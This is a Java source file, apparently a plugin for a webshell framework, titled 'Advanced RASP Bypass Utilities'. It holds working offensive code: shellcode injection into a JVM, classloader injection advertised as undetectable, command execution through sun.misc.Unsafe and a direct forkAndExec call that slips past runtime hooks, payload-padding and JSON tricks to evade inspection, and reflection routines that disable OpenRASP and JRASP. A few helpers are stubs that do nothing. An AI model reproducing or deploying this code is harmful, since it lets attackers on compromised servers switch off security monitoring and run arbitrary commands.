package shells.plugins.java.assets;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import java.util.jar.*;

/**
 * Advanced RASP Bypass Utilities
 * Contains cutting-edge bypass techniques
 */
public class RaspBypassUtils {
    
    // ==================== Windows ShellCode Injection ====================
    
    public static byte[] injectShellCodeWindows(byte[] shellcode) {
        StringBuilder result = new StringBuilder();
        
        try {
            System.loadLibrary("attach");
            
            Class<?> wvmClass = Class.forName("sun.tools.attach.WindowsVirtualMachine");
            
            Method enqueueMethod = null;
            for (Method m : wvmClass.getDeclaredMethods()) {
                if (m.getName().equals("enqueue")) {
                    enqueueMethod = m;
                    break;
                }
            }
            
            if (enqueueMethod == null) {
                return "[-] enqueue method not found".getBytes();
            }
            
            enqueueMethod.setAccessible(true);
            
            long hProcess = -1;
            String cmd = "load";
            String pipeName = "rasp_bypass_" + System.currentTimeMillis();
            
            enqueueMethod.invoke(wvmClass, hProcess, shellcode, cmd, pipeName, new Object[]{});
            
            result.append("[+] ShellCode injected successfully!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Bootstrap ClassLoader Injection ====================
    
    public static byte[] injectToBootstrap(byte[] classBytes, String className) {
        StringBuilder result = new StringBuilder();
        
        try {
            Object instrumentation = getInstrumentation();
            
            if (instrumentation == null) {
                return "[-] Cannot get Instrumentation instance".getBytes();
            }
            
            Path tempJar = Files.createTempFile("bootstrap_", ".jar");
            
            try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(tempJar.toFile()))) {
                JarEntry entry = new JarEntry(className.replace('.', '/') + ".class");
                jos.putNextEntry(entry);
                jos.write(classBytes);
                jos.closeEntry();
            }
            
            Method appendMethod = instrumentation.getClass()
                .getMethod("appendToBootstrapClassLoaderSearch", JarFile.class);
            appendMethod.invoke(instrumentation, new JarFile(tempJar.toFile()));
            
            result.append("[+] Class injected to Bootstrap ClassLoader!\n");
            result.append("[+] Class name: " + className + "\n");
            result.append("[+] ClassLoader will be null (undetectable by most tools)\n");
            
            Files.deleteIfExists(tempJar);
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    private static Object getInstrumentation() {
        try {
            Thread currentThread = Thread.currentThread();
            Field groupField = Thread.class.getDeclaredField("group");
            groupField.setAccessible(true);
        } catch (Exception ignored) {
        }
        return null;
    }
    
    // ==================== JNI Hook Bypass ====================
    
    public static byte[] bypassJniHook(String cmd) {
        StringBuilder result = new StringBuilder();
        
        try {
            String[] prefixes = {"rasp_", "hook_", "check_", "wrapped_"};
            
            for (String prefix : prefixes) {
                try {
                    String methodName = prefix + "forkAndExec";
                    result.append("[*] Found potential prefix: " + prefix + "\n");
                } catch (Exception ignored) {
                }
            }
            
            result.append(new String(execUnsafe(cmd)));
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== CPU Throttling Bypass ====================
    
    public static byte[] triggerRaspCpuThrottle() {
        StringBuilder result = new StringBuilder();
        
        try {
            result.append("[*] Attempting to trigger RASP CPU throttling...\n");
            
            int cores = Runtime.getRuntime().availableProcessors();
            ExecutorService executor = Executors.newFixedThreadPool(cores * 2);
            
            CountDownLatch latch = new CountDownLatch(1);
            
            for (int i = 0; i < cores * 2; i++) {
                executor.submit(() -> {
                    while (latch.getCount() > 0) {
                        Math.sqrt(Math.random() * Math.random());
                    }
                });
            }
            
            Thread.sleep(5000);
            latch.countDown();
            executor.shutdown();
            
            result.append("[+] CPU stress test completed\n");
            result.append("[*] RASP may have entered throttling mode\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Large Payload Bypass ====================
    
    public static byte[] bypassWithLargePayload(String cmd) {
        StringBuilder result = new StringBuilder();
        
        try {
            result.append("[*] Creating large payload to bypass RASP body limit...\n");
            
            StringBuilder padding = new StringBuilder();
            for (int i = 0; i < 100000; i++) {
                padding.append("A");
            }
            
            String largeCmd = cmd + " # " + padding.toString();
            
            result.append(new String(execUnsafe(largeCmd)));
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== JSON Compatibility Bypass ====================
    
    public static String createBypassJson(String key, String value) {
        StringBuilder json = new StringBuilder();
        json.append("{,,,,");
        json.append("\"").append(key).append("\":");
        json.append("\"").append(value).append("\"");
        json.append(",,,}");
        return json.toString();
    }
    
    public static String createUnicodeBypassJson(String key, String value) {
        Map<String, String> variants = new HashMap<>();
        variants.put("0", "\u0660");
        variants.put("1", "\u0661");
        variants.put("a", "\u0430");
        
        StringBuilder result = new StringBuilder();
        for (char c : key.toCharArray()) {
            String replacement = variants.get(String.valueOf(Character.toLowerCase(c)));
            if (replacement != null) {
                result.append("\\u").append(Integer.toHexString(replacement.charAt(0)));
            } else {
                result.append(c);
            }
        }
        
        return "{\"" + result.toString() + "\":\"" + value + "\"}";
    }
    
    // ==================== Unsafe Command Execution ====================
    
    public static byte[] execUnsafe(String cmd) {
        try {
            Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            
            Class<?> processClass;
            try {
                processClass = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                processClass = Class.forName("java.lang.ProcessImpl");
            }
            
            Object process = unsafe.allocateInstance(processClass);
            
            String[] cmdParts = cmd.split("\\s+");
            byte[][] args = new byte[cmdParts.length - 1][];
            int size = args.length;
            for (int i = 0; i < args.length; i++) {
                args[i] = cmdParts[i + 1].getBytes();
                size += args[i].length;
            }
            
            byte[] argBlock = new byte[size];
            int offset = 0;
            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, offset, arg.length);
                offset += arg.length + 1;
            }
            
            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            launchMechanismField.setAccessible(true);
            Object launchMechanism = launchMechanismField.get(process);
            
            Field helperpathField = processClass.getDeclaredField("helperpath");
            helperpathField.setAccessible(true);
            byte[] helperpath = (byte[]) helperpathField.get(process);
            
            int ordinal = (int) launchMechanism.getClass().getMethod("ordinal").invoke(launchMechanism);
            
            Method forkMethod = processClass.getDeclaredMethod("forkAndExec",
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class);
            forkMethod.setAccessible(true);
            
            int[] std_fds = new int[]{-1, -1, -1};
            byte[] prog = toCString(cmdParts[0]);
            
            int pid = (int) forkMethod.invoke(process,
                ordinal + 1, helperpath, prog, argBlock, args.length,
                null, 0, null, std_fds, false);
            
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(process, std_fds);
            
            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            InputStream in = (InputStream) getInputStreamMethod.invoke(process);
            
            return readStream(in);
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    // ==================== Reflection Bypass ====================
    
    public static byte[] disableOpenRasp() {
        StringBuilder result = new StringBuilder();
        
        try {
            Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
            Field enableHookField = hookHandlerClass.getDeclaredField("enableHook");
            enableHookField.setAccessible(true);
            
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(enableHookField, enableHookField.getModifiers() & ~Modifier.FINAL);
            
            Object enableHook = enableHookField.get(null);
            if (enableHook instanceof AtomicBoolean) {
                ((AtomicBoolean) enableHook).set(false);
            }
            
            result.append("[+] OpenRASP disabled!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    public static byte[] disableJrasp() {
        StringBuilder result = new StringBuilder();
        
        try {
            Class<?> launcherClass = Class.forName("com.jrasp.agent.AgentLauncher");
            Field raspClassLoaderMap = launcherClass.getDeclaredField("raspClassLoaderMap");
            raspClassLoaderMap.setAccessible(true);
            Map map = (Map) raspClassLoaderMap.get(null);
            
            if (map != null && !map.isEmpty()) {
                ClassLoader raspLoader = (ClassLoader) map.values().iterator().next();
                
                Class<?> algorithmManagerClass = raspLoader.loadClass(
                    "com.jrasp.core.algorithm.DefaultAlgorithmManager");
                Field algorithmMapsField = algorithmManagerClass.getDeclaredField("algorithmMaps");
                algorithmMapsField.setAccessible(true);
                Map algorithmMaps = (Map) algorithmMapsField.get(null);
                
                if (algorithmMaps != null) {
                    for (Object key : algorithmMaps.keySet()) {
                        Object algorithm = algorithmMaps.get(key);
                        try {
                            Field listField = algorithm.getClass().getDeclaredField("list");
                            listField.setAccessible(true);
                            List list = (List) listField.get(algorithm);
                            
                            for (Object item : list) {
                                Field actionField = item.getClass().getSuperclass()
                                    .getDeclaredField("action");
                                actionField.setAccessible(true);
                                actionField.set(item, 0);
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
            }
            
            result.append("[+] JRASP disabled!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Helper Methods ====================
    
    private static byte[] toCString(String s) {
        if (s == null) return null;
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    
    private static byte[] readStream(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = in.read(buffer)) != -1) {
            out.write(buffer, 0, bytesRead);
        }
        return out.toByteArray();
    }
}
